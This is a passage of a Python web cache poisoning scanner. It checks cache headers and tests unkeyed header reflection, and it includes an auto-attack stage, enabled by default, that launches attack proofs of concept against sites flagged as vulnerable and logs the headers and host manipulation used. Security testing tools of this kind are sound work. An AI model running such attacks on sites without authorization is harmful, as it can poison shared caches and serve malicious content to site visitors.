                         f.get("override_path") or f.get("encoding") or
                         f.get("extension") or f.get("delimiter") or
                         f.get("fragment") or "")
                print("    " + tag + "  " + label + "  " + str(extra))

    result["step4_advanced"] = all_adv

    # ---------- STEP 5 ----------
    if report_file:
        save_advanced_report(all_adv, report_file)
        print(C.G + "[+] Report: " + report_file + C.D)


    # ---------- STEP 6 : AUTO-ATTACK ----------
    attack_summary = {"total": 0, "hits": 0, "skipped": 0, "failed": 0}
    if do_attack:
        print("\n" + C.BOLD + C.CC +
              "[STEP 6] Auto-attacking confirmed vulnerabilities..." + C.D)

        # ⭐ attack report path (scan_dir-এর ভেতরে)
        attack_report_path = os.path.join(scan_dir, "attack_report.txt")

        attack_summary = auto_run_attacks(
            all_adv,
            report_path=attack_report_path,
        )
        result["attack_summary"] = attack_summary


        

    result["decision"] = "Completed - " + str(len(cacheable_urls)) + \
                        " cacheable URL(s), advanced tests done, " + \
                        str(attack_summary["hits"]) + " attack hits"


    return result


# ============================================================
#  MAIN CHECK
# ============================================================

def check_url(url, do_poison=False, do_advanced=False):
    url = normalize_url(url)
    res = CheckResult(url=url)
    r1 = fetch(url)
    if not r1:
        res.notes.append("request failed")
        return res
    info = analyze_cache_headers(r1)
    res.status_code = r1.status_code
    res.server = info["server"]
    res.powered_by = info["powered_by"]
    res.cache_control = info["cache_control"]
    res.age = info["age"]
    res.cf_cache_status = info["cf_cache_status"]
    res.x_cache = info["x_cache"]
    res.x_cache_status = info["x_cache_status"]
    res.via = info["via"]
    res.vary = info["vary"]
    res.etag = info["etag"]
    res.last_modified = info["last_modified"]
    res.cacheable = info["_cacheable"]
    res.cache_reason = info["_reason"]
    time.sleep(0.6)
    r2 = fetch(url)
    if r2:
        info2 = analyze_cache_headers(r2)
        if not res.cacheable and info2["_cacheable"]:
            res.cacheable = True
            res.cache_reason = info2["_reason"] + " (on 2nd request)"
        if info2["age"] and info2["age"] != res.age:
            res.notes.append("Age changed " + res.age + " -> " + info2["age"])
    if do_poison:
        res.poisoned_headers = test_unkeyed_headers(url)
    if do_advanced:
        res.notes.append("ADVANCED_PLACEHOLDER")
    return res


def print_result(res):
    print("\n" + C.BOLD + C.B + "=== " + res.url + " ===" + C.D)
    if res.status_code is None:
        print("  " + C.R + "request failed" + C.D)
        return
    print("  status        : " + str(res.status_code))
    print("  server        : " + res.server + "  (" + res.powered_by + ")")
    print("  cache-control : " + (res.cache_control or "-"))
    print("  cf-cache      : " + (res.cf_cache_status or "-"))
    print("  x-cache       : " + (res.x_cache or "-"))
    print("  age           : " + (res.age or "-"))
    print("  via           : " + (res.via or "-"))
    print("  vary          : " + (res.vary or "-"))
    if res.cacheable:
        print("  " + C.G + "[+] CACHEABLE" + C.D + "  (" + res.cache_reason + ")")
    else:
        print("  " + C.Y + "[-] Not cached" + C.D + "  (" + res.cache_reason + ")")
    if res.poisoned_headers:
        print("  " + C.M + "[!] Unkeyed header findings:" + C.D)
        for f in res.poisoned_headers:
            flag = []
            if f["reflected"]:
                flag.append(C.R + "REFLECTED" + C.D)
            if f["cacheable"]:
                flag.append(C.Y + "CACHEABLE" + C.D)
            if not flag:
                flag.append("interesting")
            print("    - " + f["header"] + ": " + ", ".join(flag) +
                  "  (status=" + str(f["status"]) +
                  ", cf=" + (f["cf_cache_status"] or "-") +
                  ", age=" + (f["age"] or "-") + ")")
            if f["reflected"] and f["cacheable"]:
                print("      " + C.R + C.BOLD +
                      ">>> Possible cache poisoning vector!" + C.D)

#  start of healper function add

def safe_open_write(path):
    """যদি ফাইলটি root-owned বা write-protected হয়,
    তবে নতুন নামে লিখে দেয় যাতে PermissionError না আসে।"""
    import os
    if os.path.exists(path):
        if not os.access(path, os.W_OK):
            base, ext = os.path.splitext(path)
            new_path = base + "_new" + ext
            print("\033[93m[!] " + path + " is not writable, "
                  "writing to " + new_path + "\033[0m")
            return open(new_path, "w", encoding="utf-8")
    return open(path, "w", encoding="utf-8")


def save_attack_report(attack_log, path,
                       total=0, hits=0, skipped=0, failed=0):
    """প্রতিটি attack আলাদা ব্লকে দেখায় — header, URL, host সব আলাদা।"""
    lines = []
    lines.append("=" * 90)
    lines.append("  AUTO-ATTACK DETAILED REPORT")
    lines.append("=" * 90)
    lines.append("")
    lines.append("Total attempts : " + str(total))
    lines.append("Successful hits: " + str(hits))
    lines.append("Skipped        : " + str(skipped))
    lines.append("Failed         : " + str(failed))
    lines.append("")

    # ── Verdict summary ──
    by_verdict = {}
    for e in attack_log:
        by_verdict.setdefault(e["verdict"], []).append(e)

    lines.append("-" * 90)
    lines.append("  VERDICT SUMMARY")
    lines.append("-" * 90)
    for v, items in sorted(by_verdict.items()):
        lines.append("  {:<22}: {}".format(v, len(items)))
    lines.append("")

    # ── Header usage summary (কোন header কতবার ব্যবহার হয়েছে) ──
    lines.append("-" * 90)
    lines.append("  HEADER USAGE SUMMARY")
    lines.append("-" * 90)
    header_count = {}
    for e in attack_log:
        for hname in (e.get("headers") or {}).keys():
            header_count[hname] = header_count.get(hname, 0) + 1
    if header_count:
        for hname, cnt in sorted(header_count.items(),
                                 key=lambda x: -x[1]):
            lines.append("  {:<35} : {}".format(hname, cnt))
    else:
        lines.append("  (no headers used)")
    lines.append("")

    # ── URL summary (কোন URL কতবার hit হয়েছে) ──
    lines.append("-" * 90)
    lines.append("  URL USAGE SUMMARY")
    lines.append("-" * 90)
    url_count = {}
    for e in attack_log:
        u = e.get("url") or "-"
        if u and u != "-":
            url_count[u] = url_count.get(u, 0) + 1
    if url_count:
        for u, cnt in sorted(url_count.items(), key=lambda x: -x[1]):
            lines.append("  {}  [{} hits]".format(u, cnt))
    else:
        lines.append("  (no URLs)")
    lines.append("")

    # ── প্রতি target আলাদা সেকশন ──
    by_target = {}
    for e in attack_log:
        by_target.setdefault(e["target"], []).append(e)

    for target, entries in by_target.items():
        lines.append("")
        lines.append("#" * 90)
        lines.append("  TARGET : " + target)
        lines.append("  Total attacks on this target : " + str(len(entries)))
        lines.append("#" * 90)
        lines.append("")

        for idx, e in enumerate(entries, 1):
            lines.append("─" * 90)
            lines.append("  ATTACK #{} — [{}] {}".format(
                idx, e["vector_id"], e["name"]))
            lines.append("─" * 90)
            lines.append("")
            lines.append("  ► Attack Type     : " + e["label"])
            lines.append("  ► Verdict         : " + e["verdict"])
            lines.append("  ► HTTP Method     : " + str(e["method"]))
            lines.append("  ► Target URL      : " + str(e["url"]))
            lines.append("")

            # ── Headers প্রতিটি আলাদা লাইনে ──
            hdrs = e.get("headers") or {}
            if hdrs:
                lines.append("  ► Header(s) Used  :")
                for hname, hval in hdrs.items():
                    lines.append("        {} : {}".format(hname, hval))
                    # যদি header-এ host থাকে, সেটা আলাদা করে দেখাই
                    if "host" in hname.lower():
                        lines.append("        └─ host manipulation: {}".format(hval))
                lines.append("")
            else:
                lines.append("  ► Header(s) Used  : (none)")
                lines.append("")

            # ── URL-এর breakdown ──
            from urllib.parse import urlparse as _up
            try:
                parsed = _up(e["url"]) if e["url"] and e["url"] != "-" else None
            except Exception:
                parsed = None
            if parsed:
                lines.append("  ► URL Breakdown   :")
                lines.append("        Scheme   : {}".format(parsed.scheme))
                lines.append("        Host     : {}".format(parsed.netloc))
                lines.append("        Path     : {}".format(parsed.path or "/"))
                lines.append("        Query    : {}".format(parsed.query or "-"))
                lines.append("")

            # ── Body ──
            if e.get("body"):
                lines.append("  ► Request Body    : " + str(e["body"])[:200])
                lines.append("")

            # ── Response ──
            lines.append("  ► Response Status : " + str(e["status"]))
            lines.append("  ► Cache Hit       : " + str(e["cache_hit"]))
            lines.append("  ► Reflected       : " + str(e["reflected"]))
            if e.get("note"):
                lines.append("  ► Note            : " + str(e["note"])[:250])
            lines.append("")
            lines.append("")

        lines.append("=" * 90)
        lines.append("")

    with safe_open_write(path) as fp:
        fp.write("\n".join(lines))

    print("\n" + C.G + "[+] Attack report saved: " + path + C.D)

# end of healper function add

def make_scan_dir(target_url, base_dir="scan_results"):
    """প্রতিটি target-এর জন্য ক্রমিক নম্বরযুক্ত folder বানায়।
    যেমন: sattacademy_1, sattacademy_2, sattacademy_3 ..."""
    import os
    from urllib.parse import urlparse

    p = urlparse(normalize_url(target_url))
    domain = (p.netloc or "unknown").split(":")[0].replace(".", "_")
    if not domain:
        domain = "unknown"

    os.makedirs(base_dir, exist_ok=True)

    # পরের ক্রমিক নম্বরটি বের করুন
    n = 1
    while True:
        candidate = os.path.join(base_dir, "{}_{}".format(domain, n))
        if not os.path.exists(candidate):
            os.makedirs(candidate)
            return candidate
        n += 1



def save_json(results, path):
    with safe_open_write(path) as fp:
        json.dump([asdict(r) for r in results], fp, ensure_ascii=False, indent=2)
    print("\n" + C.G + "[+] JSON saved: " + path + C.D)


def main():
    ap = argparse.ArgumentParser(description="Cache poisoning checker")
    ap.add_argument("-u", "--url", help="Single URL")
    ap.add_argument("-f", "--file", help="File with URLs (one per line)")
    ap.add_argument("-o", "--output", help="Save JSON output")
    ap.add_argument("--poison", action="store_true",
                    help="Run unkeyed header injection tests")
    ap.add_argument("--threads", type=int, default=5, help="Threads (default 5)")
    ap.add_argument("--advanced", action="store_true",
                    help="Run advanced vectors V1-V80 directly (no auto flow)")
    ap.add_argument("--report", help="Save advanced English report to this file")
    ap.add_argument("--auto", action="store_true",
                    help="AUTO: base check -> static discovery -> advanced poison -> report")
    ap.add_argument("--txt", default="static_urls.txt",
                    help="TXT file for discovered static URLs (default: static_urls.txt)")
    ap.add_argument("--auto-report", default="auto_report.txt",
                    help="English report file for --auto (default: auto_report.txt)")
    
    ap.add_argument("--attack", action="store_true", default=True,
                    help="Auto-run attack PoCs on confirmed vulnerabilities "
                         "(default: True, use --no-attack to disable)")
    ap.add_argument("--no-attack", dest="attack", action="store_false",
                    help="Disable automatic attack execution")


    args = ap.parse_args()



    urls = []
    if args.url:
        urls.append(args.url)
    if args.file:
        with open(args.file, "r", encoding="utf-8") as fp:
            for line in fp:
                line = line.strip()
                if line and not line.startswith("#"):
                    urls.append(line)

    # ========== AUTO MODE ==========
    if args.auto:
        if not urls:
            ap.error("--auto requires -u URL or -f file")
        print(C.BOLD + C.CC +
              "[*] AUTO MODE - " + str(len(urls)) + " target(s)" + C.D)
        print(C.CC + "    Pipeline: base -> static discovery -> "
              "advanced V1-V80 -> report" + C.D)
        for u in urls:
            print("\n" + C.BOLD + C.B + ("#" * 70) + C.D)
            print(C.BOLD + C.B + "# TARGET: " + u + C.D)
            print(C.BOLD + C.B + ("#" * 70) + C.D)
            rep = auto_pipeline(u, txt_file=args.txt,report_file=args.auto_report,do_attack=args.attack)
            print("\n" + C.G + "[+] Decision: " + rep["decision"] + C.D)
        print("\n" + C.G + C.BOLD +
              "[+] AUTO run finished. Report: " + args.auto_report + C.D)
        return

    # ========== ADVANCED MODE ==========
    if args.advanced:
        if not urls:
            ap.error("--advanced requires -u URL or -f file")
        print(C.BOLD + C.CC +
              "[*] ADVANCED MODE: V1-V80 on " + str(len(urls)) + " URL(s)" + C.D)
        all_adv = []
        for u in urls:
            print("\n" + C.BOLD + C.B + ">>> " + u + C.D)
            adv = run_advanced_vectors(normalize_url(u))
            all_adv.append(adv)
            for key in ALL_VECTOR_KEYS:
                for f in adv.get(key, []):
                    tag = (C.R + "VULN" + C.D) if f["vulnerable"] \
                          else (C.Y + "safe" + C.D)
                    label = "[" + f["vector_id"] + "] " + f["name"]
                    extra = (f.get("header") or f.get("probe") or
                             f.get("body") or f.get("variant") or
                             f.get("cookie_name") or f.get("param") or
                             f.get("combo") or f.get("injection") or
                             f.get("port") or f.get("override_method") or
                             f.get("override_path") or f.get("encoding") or
                             f.get("extension") or f.get("delimiter") or
                             f.get("fragment") or "")
                    print("    " + tag + "  " + label + "  " + str(extra))
        if args.report:
            save_advanced_report(all_adv, args.report)
        return

    # ========== DEFAULT MODE ==========
    if not urls:
        ap.error("Give -u URL or -f file")
        sys.exit(1)
    print(C.BOLD + C.CC + "[*] Checking " + str(len(urls)) +
          " URL(s), poison_mode=" + str(args.poison) + C.D)
    results = []
    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futs = {pool.submit(check_url, u, args.poison): u for u in urls}
        for fut in as_completed(futs):
            try:
                res = fut.result()
            except Exception as e:
                print(C.R + "[!] error on " + futs[fut] + ": " + str(e) + C.D)
                continue
            results.append(res)
            print_result(res)
    print("\n" + C.BOLD + C.B + "--- SUMMARY ---" + C.D)
    cacheable = [r for r in results if r.cacheable]
    poisonable = [r for r in results if r.poisoned_headers and
                  any(h["reflected"] and h["cacheable"]
                      for h in r.poisoned_headers)]
    print("  total      : " + str(len(results)))
    print("  " + C.G + "cacheable  : " + str(len(cacheable)) + C.D)
    print("  " + C.R + "poisonable : " + str(len(poisonable)) + C.D)
    if poisonable:
        print("\n  " + C.R + C.BOLD + "Potentially vulnerable URLs:" + C.D)
        for r in poisonable:
            print("    - " + r.url)
    if args.output:
        save_json(results, args.output)


if __name__ == "__main__":
    main()